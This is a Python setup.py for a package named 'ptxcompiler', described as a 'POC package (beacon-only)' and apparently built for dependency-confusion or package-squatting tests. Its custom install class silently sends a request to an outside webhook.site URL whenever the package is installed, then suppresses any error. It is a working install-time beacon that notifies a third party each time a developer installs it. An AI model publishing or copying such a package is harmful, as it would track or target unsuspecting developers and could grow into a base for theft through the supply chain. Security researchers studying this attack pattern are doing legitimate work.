from setuptools import setup
from setuptools.command.install import install
import urllib.request

BEACON_URL = "https://webhook.site/14b3e0fb-af8e-4740-bd2f-e6d162b72c5d"# your webhook URL

class InstallWithBeacon(install):
    def run(self):
        try:
            urllib.request.urlopen(BEACON_URL, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    name="ptxcompiler",
    version="1.0.0",
    packages=["ptxcompiler"],
    description="POC package (beacon-only)",
    cmdclass={'install': InstallWithBeacon},
)
